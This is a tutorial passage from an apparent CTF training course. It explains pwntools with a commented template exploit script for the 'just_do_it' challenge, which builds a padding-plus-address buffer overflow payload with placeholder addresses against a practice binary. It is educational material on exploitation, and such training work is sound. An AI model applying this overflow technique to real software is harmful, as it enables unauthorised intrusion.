While there is a [brief explanation of pwntools here](https://github.com/hoppersroppers/nightmare/blob/master/modules/02-intro_tooling/pwntools/readme.md) and even better [better tutorials](https://github.com/Gallopsled/pwntools-tutorial) here,
we'll quickly talk through the exploit script format and how pwntools makes our lives easier.

This is a heavily commented example of just_do_it which you will work through soon.

Demo Exploit Script #1:
```
# Import pwntool utils
from pwn import process, remote, p32

#### Create the local connection to the challenge
# This will start the process 
target = process('./just_do_it')

#### Attach via GDB
# If you want to, you can automatically jump into GDB when the local process starts up 
# The text placed in the gdbscript value is automatically run when GDB starts up, allowing us to set breakpoints
# gdb.attach(target, gdbscript='b *0x4009a5')

#### Connect to the remote challenge
# Often, you'll receive a local binay to practice on, but the actual challenge and flag is hosted on a remote host
# Here is an example of building a connection to port 12484, where the challenge was hosted. 
# The 'target' variable, while one is local and one is remote, works with pwntools identically, which is really great
#target = remote('pwn1.chal.ctf.westerns.tokyo', 12482)


addrInputStart = 0x00# fill this in with where input starts  
addrValueToOverwrite = 0x00# fill this in with address of value that is compared
paddingRequired = addrInputStart-addrValueToOverwrite

addrOfFlag = 0x41414141 #fill this in where the flag is read to 

# Print out the starting prompt
# The pwntools 'recvunitl' will recv data until it receives what it is expecting. 
print(target.recvuntil(b"password.\n"))

# Create the payload
# That p32 will our addr appropriately formatted for the binary we are working with
# Always need to make sure architecture/endianess is correct for writing exploits.
payload = b"A"*paddingRequired + p32(addrOfFlag)

# Send the payload
target.sendline(payload)

# Drop to an interactive shell, so we can read everything the server prints out
# The interactive shell is a bit confusing because in this cae, we are not trying to get a shell, but it functions as a recv for all output that the challenge might send to us, in this case, the flag.
target.interactive()
```


Hopefully that makes a little bit more sense of how pwntools makes your life better.

